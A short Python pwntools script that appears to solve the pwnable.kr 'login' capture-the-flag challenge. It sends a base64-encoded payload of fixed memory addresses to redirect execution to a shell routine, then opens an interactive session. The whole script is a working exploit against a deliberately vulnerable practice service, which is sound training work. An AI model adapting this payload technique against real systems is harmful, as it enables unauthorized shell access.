from pwn import *
from base64 import *
shell = 0x8049284
#p = process('./login')
p = remote('pwnable.kr', 9003)
p.recvuntil('cate :')
payload  = ''
payload += p32(0x811eb40)
payload += p32(shell)
payload += p32(0x811eb40)
p.sendline(b64encode(payload))
p.interactive()
